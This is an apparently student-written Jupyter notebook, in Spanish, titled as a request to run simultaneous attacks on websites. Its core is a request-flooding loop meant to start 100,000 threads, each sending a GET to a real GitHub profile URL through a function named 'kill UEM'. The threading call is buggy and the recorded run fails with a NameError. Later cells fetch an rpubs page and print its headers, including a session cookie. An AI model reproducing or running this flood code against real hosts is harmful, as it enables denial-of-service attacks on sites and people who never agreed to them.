# %% [markdown]
# ## Se solicita realizar ataques simultaneos a las siguientes sitios web

# %%
import threading, os,platform,requests,json

# %%
numero_de_veces_hasta_matar_uem = 100000

# %%
url_ = "https://github.com/sukuzhanay"

# %% [markdown]
# ## Http codigos

# %%
from IPython import display

# %%
display.Image("statuscode (1).png")

# %%
def matar_uem():
    print (requests.get(url_))
    threading.current_thread()

# %%
for i in range (numero_de_veces_hasta_matar_uem):
    threading.Thread(target=matar_uem()).start()
# Out:
# ---------------------------------------------------------------------------
# NameError                                 Traceback (most recent call last)
# Cell In [1], line 1
# ----> 1 for i in range (numero_de_veces_hasta_matar_uem):
#       2     threading.Thread(target=matar_uem()).start()
#
# NameError: name 'numero_de_veces_hasta_matar_uem' is not defined

# %%
res_=requests.get("https://rpubs.com/christian_sucuzhanay")

# %%
res_.headers
# Out:
# {'Date': 'Thu, 06 Oct 2022 14:44:17 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Status': '200 OK', 'Cache-Control': 'max-age=0, private, must-revalidate', 'Referrer-Policy': 'strict-origin-when-cross-origin', 'X-Permitted-Cross-Domain-Policies': 'none', 'X-XSS-Protection': '1; mode=block', 'X-Request-Id': '7592a4df-4d32-4fcf-9674-f4d9e6af329c', 'X-Download-Options': 'noopen', 'ETag': 'W/"bf933924958de3e79fca00646baf19bb"', 'X-Frame-Options': 'SAMEORIGIN', 'X-Runtime': '0.063972', 'X-Content-Type-Options': 'nosniff', 'Set-Cookie': '_session_id=40af1c3bedf000427d6031fe8266eae1; path=/; HttpOnly', 'X-Powered-By': 'Phusion Passenger 6.0.2', 'Server': 'nginx/1.14.0 + Phusion Passenger 6.0.2', 'Content-Encoding': 'gzip'}

# %%
html=res_.text
